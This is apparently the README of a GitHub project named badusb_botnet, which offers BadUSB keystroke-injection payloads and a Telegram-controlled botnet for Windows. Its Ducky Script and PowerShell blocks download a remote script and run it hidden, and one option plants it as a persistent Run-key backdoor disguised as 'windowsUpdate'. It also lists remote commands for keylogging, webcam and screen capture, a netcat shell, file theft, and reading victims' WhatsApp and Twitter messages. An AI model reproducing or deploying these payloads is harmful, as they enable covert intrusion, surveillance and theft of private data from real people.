# badusb_botnet
:smiling_imp::busts_in_silhouette: Infect a pc with badusb and establish a connection through telegram.

# Configuration

```powershell
############
## CONFIG ##
############

$BotToken = "<BOTTOKEN>"
$ChatID = '<CHATID>'
$githubScript = '<you_fork/poc.ps1>'
```
>*To create a telegram bot: https://core.telegram.org/bots#6-botfather*

>*To get ChatID: https://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id*

## Option 1

```
> (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
> powershell.exe -windowstyle hidden -file poc.ps1
```

```
DELAY 3000
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 750
STRING (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
DELAY 500
ENTER
STRING powershell.exe -windowstyle hidden -file poc.ps1
DELAY 500
ENTER
```

## Option 2 (Backdoor)

```
> reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
> Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
> reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
```
```
DELAY 3000
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 750
STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
DELAY 500
ENTER
STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
DELAY 500
ENTER
STRING reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
DELAY 500
ENTER
```

> Link to convert those scripts to .ino: https://malduino.com/converter/

### Telegram Options

#### Basic

- /list (List all devices availables)
- /select ```IP``` ```command``` (Execute a command)
- /stop ```IP``` (Stop remote connection)
- /cleanAll ```IP``` (Clean all files)
- /ipPublic ```IP``` (Geolocate IP)
- /download ```IP``` ```file``` (Download a file from PC)

#### Advanced

- /screenshot ```IP``` (Capture screen)
- /backdoor ```IP``` (Create a persistent backdoor)
- /webcam ```IP```
- /keylogger ```IP``` ```time in seconds```
- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /nc ```IP``` (Download netcat and execute ```nc -lp 8888 -v -e cmd.exe``` use ```nc <IP> 8888``` to connect)
- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /stopnc ```IP``` (Stop nc.exe and erase all archives) 

#### Ultra :squirrel: 

- /hackT ```IP``` (Get Twitter messages if the victim is authenticated) [Only web - W10]
- /hackW ```IP``` (Get WhatsApp messages if the victim is authenticated) [Only Web - W10]
- <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="24px" height="24px" />  /starttwitch ```IP``` ```STREAM_KEY``` (Start a video transmission on Twitch)
- <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="24px" height="24px" />  /stoptwitch ```IP``` (Stop ffmpeg.exe and erase all archives) 

### PoCs

:link::tv: [TOUR - POC](https://youtu.be/pFR8B0HNfts "TOUR - POC")

:link::tv: [TWITCH STREAMING - POC](https://youtu.be/3GBIVNhHT0Y "TWITCH STREAMING - POC")

:link::tv: [KEYLOGGER - POC](https://youtu.be/f6JCPnsyGp0 "KEYLOGGER -POC")


##### {TODO}

- Change all Invoke-WebRequest to cURL. (Invoke-WebRequest requires set up Internet Explorer)
- Create an ID for each connected user.
- Hack WhatsApp on .exe.
- :heavy_check_mark: Fix Twitch streaming.
- :heavy_check_mark: Fix keylogger.
- Add monitor selector to screenshot.
- Add windows version detector in HackTwitterW10() and hackWhatsAPPW10() functions.
- Add hackGmail().
- :heavy_check_mark: Verbose via telegram messages.
- Netcat reverse connection.
